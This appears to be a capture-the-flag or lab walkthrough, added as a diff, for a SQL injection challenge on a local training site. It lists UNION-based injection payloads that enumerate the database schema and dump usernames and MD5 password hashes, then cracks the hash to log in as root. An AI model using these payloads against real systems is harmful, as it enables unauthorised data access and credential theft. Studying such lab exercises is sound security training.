@@ -1,0 +1,24 @@
+Those SQL Injections can be done in http://10.13.0.186/?page=searchimg
+
+Make those SQL Injections to find table structure and databases :
+1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+We are interested by this table :
+----------------------------------
+|  Member_Brute_Force.db_default |
+----------------------------------
+|  id  |  username  |  password  |
+-------------^------------^-------
+
+
+Make this SQL Injection in the "IMAGE NUMBER:" field :
+1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default
+
+We get 2 combinaison username:password :
+- root:3bf1114a986ba87ed28fc1b5884fc2f8
+- admin:3bf1114a986ba87ed28fc1b5884fc2f8
+
+We md5 decode the password, we get the root:shadow combinaison than we can try in Sign In page.
+
+http://10.13.0.186/?page=signin
